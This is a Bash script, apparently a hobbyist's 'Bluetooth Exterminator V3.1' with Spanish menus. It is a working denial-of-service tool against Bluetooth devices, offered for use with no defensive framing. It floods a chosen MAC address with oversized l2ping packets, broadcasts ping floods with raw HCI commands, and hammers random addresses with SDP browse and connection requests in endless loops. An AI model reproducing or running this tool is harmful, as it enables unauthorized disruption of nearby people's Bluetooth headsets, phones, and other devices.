#!/bin/bash
## Created by alespdev

echo -ne "\e[8;30;60t"


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

INTERFACE=""
INTERFACE_ADDR=""


draw_line() {
    echo -e "${BLUE}------------------------------------------------------------${NC}"
}

draw_header() {
    clear
    echo -e "${RED}${BOLD}############################################################${NC}"
    echo -e "${RED}${BOLD}#                BLUETOOTH EXTERMINATOR V3.1               #${NC}"
    echo -e "${RED}${BOLD}#                Created by: ${WHITE}alespdev${RED}                      #${NC}"
    echo -e "${RED}${BOLD}############################################################${NC}"
}

draw_subheader() {
    echo -e "${PURPLE}>> $1${NC}"
    draw_line
}

trap menu_b SIGINT

menu_b() {
    echo -e "\n\n"
    draw_line
    echo -e "${YELLOW}[!] Interrupción detectada por el usuario.${NC}"
    echo -e "${GREEN}[*] Limpiando procesos...${NC}"
    pkill l2ping > /dev/null 2>&1
    pkill sdptool > /dev/null 2>&1
    sleep 1
    menu
}


select_iface() {

    local valid=false

    draw_header
    draw_subheader "CONFIGURACION DE HARDWARE"
    
    echo -e "${WHITE}Interfaces Bluetooth detectadas:${NC}"
    hciconfig | awk '/hci[0-9]/ {iface=$1} /BD Address:/ {print "  ~ " iface " \t[" $3 "]"}' | sed 's/://'
    draw_line
    
    echo -e "\n${WHITE}Escribe la interfaz (ej. hci0):${NC}"
    echo -ne "${BLUE}>> ${NC}"
    read input_iface

    if hciconfig | grep -q "$input_iface"; then
        INTERFACE=$input_iface
        valid=true
        echo -e "${GREEN}[OK] Interfaz $INTERFACE configurada.${NC}"
        INTERFACE_ADDR=$(hciconfig $INTERFACE | grep "BD Address" | awk '{print $3}')
        sleep 1
    else
        echo -e "${RED}[ERROR] Interfaz no válida.${NC}"
        sleep 2
        select_iface
    fi
}

if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[!] ERROR: Ejecuta con sudo.${NC}"
    exit 1
fi

reset_bt() {
    echo -e "${YELLOW}[*] Reiniciando $INTERFACE...${NC}"
    hciconfig $INTERFACE down && sleep 1 && hciconfig $INTERFACE up
    echo -e "${GREEN}[OK] Listo.${NC}"
}

gatt_stress() {

    local reqs=0

    draw_header
    draw_subheader "MODO: GATT/SDP STRESS"
    echo -e "${WHITE}IFACE:${NC} ${CYAN}$INTERFACE $INTERFACE_ADDR${NC} | ${WHITE}DEV:${NC} ${RED}alespdev${NC}"
    draw_line
    echo -e "${YELLOW}[INFO] Ctrl+C para detener.${NC}"
    reset_bt
    while true; do
        RAND_MAC=$(printf '00:%02X:%02X:%02X:%02X:%02X' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
        sdptool -i $INTERFACE browse $RAND_MAC > /dev/null 2>&1 &
        hcitool -i $INTERFACE cc $RAND_MAC > /dev/null 2>&1 &
        ((reqs++))
        echo -ne "${RED}[#] INUNDANDO SERVICIOS... [X] \r${NC}"
        echo -ne "${YELLOW}[*] Peticiones enviadas... [${WHITE}$reqs${YELLOW}] \r${NC}"        
        sleep 0.05
    done
}

broadcast_jam() {
    
    local pkts=0

    draw_header
    draw_subheader "MODO: BROADCAST JAMMING"
    echo -e "${WHITE}IFACE:${NC} ${CYAN}$INTERFACE $INTERFACE_ADDR${NC} | ${WHITE}DEV:${NC} ${RED}alespdev${NC}"
    draw_line
    echo -e "${YELLOW}[INFO] Ctrl+C para detener.${NC}"
    reset_bt
    while true; do
        hcitool -i $INTERFACE cmd 0x01 0x0001 0x33 0x8b 0x9e 0x01 0x00 > /dev/null 2>&1
        l2ping -i $INTERFACE -c 10 -f -s 640 00:00:00:00:00:00 > /dev/null 2>&1 &
        ((pkts+=10))
        echo -ne "${YELLOW}[#] SATURANDO ESPECTRO... [====] \r${NC}"
        echo -ne "${YELLOW}[*] Paquetes enviados... [${WHITE}$pkts${YELLOW}] \r${NC}"

        sleep 0.05
    done
}

target_jam() {
    local mac=""
    local pkts=0
    
    while true; do
        draw_header
        draw_subheader "MODO: TARGETED JAMMING"
        echo -e "${WHITE}MAC Objetivo (XX:XX:XX:XX:XX:XX):${NC}"
        echo -ne "${BLUE}>> ${NC}"
        read mac

        if [[ $mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            break
        else
            echo -e "${RED}[ERROR] MAC no válida. Reintenta...${NC}"
            sleep 1.5
        fi
    done

    draw_header
    draw_subheader "MODO: TARGETED JAMMING"
    echo -e "${WHITE}OBJ:${NC} ${RED}$mac${NC} | ${WHITE}IFACE:${NC} ${CYAN}$INTERFACE  $INTERFACE_ADDR${NC} | ${WHITE}DEV:${NC} ${RED}alespdev${NC}"
    draw_line
    echo -e "${YELLOW}[INFO] Ctrl+C para detener.${NC}"
    reset_bt
    
    while true; do
        l2ping -i $INTERFACE -f -s 640 $mac > /dev/null 2>&1
        ((pkts++))
        echo -ne "${YELLOW}[#] ATACANDO OBJETIVO... [====] \r${NC}"
        echo -ne "${YELLOW}[*] Paquetes enviados... [${WHITE}$pkts${YELLOW}] \r${NC}"
        sleep 0.05
    done
}

menu() {

    draw_header
    echo -e "${WHITE}INTERFAZ ACTIVA:${NC} ${CYAN}${BOLD}$INTERFACE $INTERFACE_ADDR${NC}"
    draw_line
    echo -e "${GREEN}OPCIONES DISPONIBLES:${NC}"
    echo -e ""
    echo -e "  1. Broadcast Jamming (Global)"
    echo -e "  2. Targeted Jamming  (MAC)"
    echo -e "  3. GATT/SDP Stress   (Fuerza Bruta)"
    echo -e "  4. Resetear Adaptador"
    echo -e "  5. Cambiar Interfaz"
    echo -e "  6. Salir"
    echo -e ""
    draw_line
    echo -e "${WHITE}Dev: ${RED}alespdev${NC}"
    echo -ne "${BLUE}>> Selección: ${NC}"
    read opt

    

    case $opt in
        1) broadcast_jam ;;
        2) target_jam ;;
        3) gatt_stress ;;
        4) reset_bt && sleep 1 && menu ;;
        5) select_iface && menu ;;
        6) echo -e "\nSaliendo..."; reset_bt && exit 0 ;;
        *) echo -e "\n${RED}[!] Opción no válida.${NC}"; sleep 1; menu ;;
    esac
}

select_iface
menu
